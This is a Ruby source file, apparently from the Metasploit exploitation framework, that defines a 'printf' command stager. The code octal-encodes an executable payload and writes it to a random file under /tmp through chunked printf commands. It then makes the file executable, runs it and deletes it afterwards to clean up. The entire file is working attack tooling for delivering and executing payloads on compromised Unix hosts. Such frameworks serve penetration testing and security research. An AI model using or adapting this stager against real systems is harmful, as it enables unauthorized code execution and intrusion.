# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'
require 'shellwords'

module Rex
module Exploitation

class CmdStagerPrintf < CmdStagerBase

  def initialize(exe)
    super

    @var_elf = Rex::Text.rand_text_alpha(5)
  end

  #
  # Override to ensure opts[:temp] is a correct *nix path
  #
  def generate(opts = {})
    opts[:temp] = opts[:temp] || '/tmp/'
    opts[:temp].gsub!(/\\/, '/')
    opts[:temp] = opts[:temp].shellescape
    opts[:temp] << '/' if opts[:temp][-1,1] != '/'
    super
  end

  #
  # Override to set the extra byte count
  #
  def generate_cmds(opts)
    @cmd_start = "printf '"
    @cmd_end   = "'>>#{@tempdir}#{@var_elf}"
    xtra_len = @cmd_start.length + @cmd_end.length
    opts.merge!({ :extra => xtra_len })

    if (opts[:linemax] - opts[:extra]) < 4
      raise RuntimeError, "Not enough space for command - #{opts[:extra] + 4} byte required, #{opts[:linemax]} byte available"
    end

    super
  end

  #
  # Encode into a "\12\345" octal format that printf understands
  #
  def encode_payload(opts)
    return Rex::Text.to_octal(@exe, "\\")
  end

  #
  # Override it to ensure that the octal representation of a byte isn't cut
  #
  def slice_up_payload(encoded, opts)
    encoded_dup = encoded.dup

    parts = []
    xtra_len = opts[:extra]
    xtra_len ||= 0
    while (encoded_dup.length > 0)
      temp = encoded_dup.slice(0, (opts[:linemax] - xtra_len))

      # remove the last octal escape if it is imcomplete
      if encoded_dup.length > temp.length and encoded_dup[temp.length] != '\\'
        pos = temp.rindex('\\')
        temp.slice!(pos..temp.length-1)
      end

      parts << temp
      encoded_dup.slice!(0, temp.length)
    end

    parts
  end

  #
  # Combine the parts of the encoded file with the stuff that goes
  # before and after it.
  #
  def parts_to_commands(parts, opts)
    parts.map do |p|
      @cmd_start + p + @cmd_end
    end
  end

  #
  # Since the binary has been already dropped to disk, just execute and
  # delete it
  #
  def generate_cmds_decoder(opts)
    cmds = []
    # Make it all happen
    cmds << "chmod +x #{@tempdir}#{@var_elf}"
    cmds << "#{@tempdir}#{@var_elf}"

    # Clean up after unless requested not to..
    unless opts[:nodelete]
      cmds << "rm -f #{@tempdir}#{@var_elf}"
    end

    return cmds
  end

  def cmd_concat_operator
    " ; "
  end

end
end
end
